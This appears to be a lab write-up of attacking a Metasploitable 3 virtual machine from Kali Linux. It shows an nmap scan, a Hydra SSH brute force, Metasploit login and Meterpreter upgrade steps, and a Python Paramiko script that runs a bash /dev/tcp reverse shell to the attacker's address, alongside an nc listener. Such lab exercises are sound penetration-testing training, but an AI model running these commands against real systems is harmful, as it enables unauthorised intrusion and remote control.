# Phase 1: Exploitation and Reverse Shell
## Lab Setup & Connectivity Check

### Virtual Machines Used
| Role         | OS                 | IP Address         |
|--------------|--------------------|--------------------|
| Attacker     | Kali Linux         | 192.168.142.129    |
| Victim       | Metasploitable 3   | 192.168.142.131    |

### Connectivity Test (Ping)

#### Attacker ➜ Victim
```bash
ping 192.168.142.131
```
<img width="873" alt="Screenshot 2025-04-21 193227" src="https://github.com/user-attachments/assets/73da16f9-f226-4db0-b2b3-a9234ee43dc8" />

#### Victim ➜ Attacker
```bash
ping 192.168.142.129
```
<img width="419" alt="Screenshot 2025-04-21 193354" src="https://github.com/user-attachments/assets/950323b3-59ba-4e8d-a9ce-52460545e293" />


Successful ICMP replies confirm two-way communication is established.

---
 ## Task 1.1: Compromise the target using Metasploit
 
 ### Service Targeted
 - **Service**: SSH (OpenSSH 6.6.1p1)
 - **Vulnerable Credentials**: `vagrant:vagrant`
 
 ### Steps Followed:
 1. **Reconnaissance**:
    ```bash
    nmap -sV -p- 192.168.142.131
    ```
<img width="695" alt="Screenshot 2025-04-21 195543" src="https://github.com/user-attachments/assets/49b83e0a-cf98-49e4-b86a-e7f53381f40d" />

    - Identified OpenSSH running on port 22
 
 2. **Brute-Force with Hydra**:
    ```bash
    hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131
    ```
<img width="527" alt="Screenshot 2025-04-21 221524" src="https://github.com/user-attachments/assets/6ee6884e-569b-4013-b543-28b949035cfe" />

    - Discovered working credentials: `vagrant:vagrant`
 
 3. **Exploit with Metasploit**:
    ```
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.168.142.131
    set USERNAME vagrant
    set PASSWORD vagrant
    run
    ```
    <img width="776" alt="Screenshot 2025-04-22 000153" src="https://github.com/user-attachments/assets/805f1eb1-15f3-4580-9845-f7b70a1f24e7" />
<img width="959" alt="Screenshot 2025-04-22 000214" src="https://github.com/user-attachments/assets/4ad08960-3503-42d4-b984-8c7b5a21ac9e" />

    - SSH shell session established
 
 4. **Upgrade to Meterpreter**:
    ```
    use post/multi/manage/shell_to_meterpreter
    set SESSION 1
    run
    sessions
    sessions 2
    shell
    ```
<img width="676" alt="Screenshot 2025-04-22 000332" src="https://github.com/user-attachments/assets/e355856b-ba2f-4a39-b99e-abad6ca37f2b" />
<img width="773" alt="Screenshot 2025-04-22 000304" src="https://github.com/user-attachments/assets/70e3dd0d-61f7-41d5-b7f3-6b5e7b1061a0" />
<img width="720" alt="Screenshot 2025-04-22 000244" src="https://github.com/user-attachments/assets/84dc529f-e7a7-4458-a8ff-12f9a80a8d15" />

    - Upgraded shell to Meterpreter session
 
 
 ## Task 1.2: Exploit via Custom Python Script
 
 ### Script Summary
 - Used Python with Paramiko to automate SSH login and trigger a reverse shell.
 <img width="583" alt="Screenshot 2025-04-22 003335" src="https://github.com/user-attachments/assets/64fe5eb6-a283-4036-a687-d16b3b3987b7" />

 ### Python Script: `ssh_bruteforce_reverse.py`
 ```python
 import paramiko
 import time
 
 host = "192.168.142.131"
 port = 22
 username = "vagrant"
 password = "vagrant"
 reverse_shell_cmd = "bash -i >& /dev/tcp/192.168.142.129/4444 0>&1"
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 client.connect(host, port=port, username=username, password=password)
 
 stdin, stdout, stderr = client.exec_command(reverse_shell_cmd)
 time.sleep(2)
 client.close()
 ```
 
 ### Listener on Attacker Machine
 ```bash
 nc -lvnp 4444
 ```
<img width="542" alt="Screenshot 2025-04-22 003401" src="https://github.com/user-attachments/assets/c980584d-64bb-4fce-a2db-7005d5083a9d" />
<img width="521" alt="Screenshot 2025-04-22 003435" src="https://github.com/user-attachments/assets/a0452dd1-0094-4592-8e98-73079a36a9bd" />

 - Successful reverse shell received.
 
 ---
 
